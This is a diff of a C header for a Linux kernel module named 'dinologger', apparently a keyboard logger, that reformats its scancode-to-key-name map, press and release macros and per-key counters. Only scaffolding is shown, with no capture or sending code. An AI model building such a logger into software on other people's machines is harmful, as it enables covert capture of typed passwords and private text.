@@ -11,83 +11,44 @@
 #include "linux/slab.h"
 #include "linux/kernel.h"
 
-int register_device(void);
-void unregister_device(void);
 int __init m_init(void);
 void __exit m_exit(void);
-
 ssize_t device_read(struct file *, char *, size_t, loff_t *);
-void add_entry(int scancode, int release, struct rtc_time *time);
-void add_to_cd(char *str);
-
-char *strdup(char const *str);
-
-#define BUFFER_SIZE 4096
 
 #define DEVICE_NAME "dinologger"
 #define LOG(msg) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n")
 #define LOGF(msg, ...) printk(KERN_NOTICE DEVICE_NAME ": " msg "\n", __VA_ARGS__)
 
 #define STATE(release) (release ? "Released" : "Pressed")
-#define NAME(scancode) (scancode >= 0 && scancode < 97 ? kbus[scancode] : kbus[0])
-#define STAT(scancode) (scancode >= 0 && scancode < 97 ? stats[scancode]++ : stats[0]++)
+#define NAME(scancode) (scancode >= 0 && scancode < 97 ?		\
+							kbus[scancode] : kbus[0])
+#define STAT(scancode) (scancode >= 0 && scancode < 97 ?		\
+							stats[scancode]++ : stats[0]++)
+
 #define MAPPED(scancode)	((scancode > 0 && scancode < 76)	\
 						||	(scancode > 76 && scancode < 84)	\
 						||	(scancode > 86 && scancode < 89)	\
 						||	(scancode == 96))
 
 #define WINTER_TIME(x)															\
-		if (x.tm_yday <= 89 || x.tm_yday >= 299) {									\
+		if (x.tm_yday <= 89 || x.tm_yday >= 299) {								\
 			x.tm_hour = (x.tm_hour + 1) % 24;									\
 		}
 
 #define RELEASE 0b10000000
 #define CANCEL_RELEASE 0b01111111
+#define BUFFER_SIZE 4096
 
-#define ESCAPE "Escape"
-#define BACKSPACE "Delete"
-#define TAB "Tab"
-#define ENTER "Enter"
-#define CTRL "Ctrl"
-#define LSHIFT "Left Shift"
-#define RSHIFT "Right Shift"
-#define ALT "Alt"
-#define SPACE "Space"
-#define CAPS_LOCK "Caps Lock"
-#define F1 "F1"
-#define F2 "F2"
-#define F3 "F3"
-#define F4 "F4"
-#define F5 "F5"
-#define F6 "F6"
-#define F7 "F7"
-#define F8 "F8"
-#define F9 "F9"
-#define F10 "F10"
-#define F11 "F11"
-#define F12 "F12"
-#define FN "Fn"
-#define NUM_LOCK "Num Lock"
-#define SCROLL_LOCK "Scroll Lock"
-#define HOME "Home"
-#define UP "Up"
-#define LEFT "Left"
-#define RIGHT "Right"
-#define DOWN "Down"
-#define PAGE_UP "Page Up"
-#define PAGE_DOWN "Page Down"
-#define END "End"
-#define INSERT "Insert"
-#define DELETE "Delete"
 #define UNMAPPED "Unmapped"
 
-#define US_KBMAP                                                               \
-	"undefined", ESCAPE, "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=",     \
-		BACKSPACE, TAB, "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[",	\
-		"]", ENTER, CTRL, "a", "s", "d", "f", "g", "h", "j", "k", "l", ";",		\
-		"\'", "`", LSHIFT, "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",	\
-		"/", RSHIFT, "*", ALT, SPACE, CAPS_LOCK, F1, F2, F3, F4, F5, F6, F7,	\
-		F8, F9, F10, NUM_LOCK, SCROLL_LOCK, HOME, UP, PAGE_UP, "-", LEFT,		\
-		UNMAPPED, RIGHT, "+", END, DOWN, PAGE_DOWN, INSERT, DELETE, UNMAPPED,	\
-		UNMAPPED, UNMAPPED, F11, F12, UNMAPPED, UNMAPPED, UNMAPPED, UNMAPPED,	\
-		UNMAPPED, UNMAPPED, UNMAPPED, FN
+#define US_KBMAP																\
+	"undefined", "Escape", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0",	\
+	"-", "=", "Remove", "Tab", "q", "w", "e", "r", "t", "y", "u", "i", "o",		\
+	"p", "[", "]", "Enter", "Ctrl", "a", "s", "d", "f", "g", "h", "j", "k",		\
+	"l", ";", "\'", "`", "Left Shift", "\\", "z", "x", "c", "v", "b", "n", "m",	\
+	",", ".", "/", "Right Shift", "*", "Alt", " ", "Caps Lock", "F1", "F2",		\
+	"F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "Num Lock", "Scroll Lock",	\
+	"Home", "Up", "Page up", "-", "Left", UNMAPPED, "Right", "+", "End",		\
+	"Down", "Page down", "Insert", "Delete", UNMAPPED, UNMAPPED, UNMAPPED,		\
+	"F11", "F12", UNMAPPED, UNMAPPED, UNMAPPED, UNMAPPED, UNMAPPED, UNMAPPED,	\
+	UNMAPPED, "Fn"
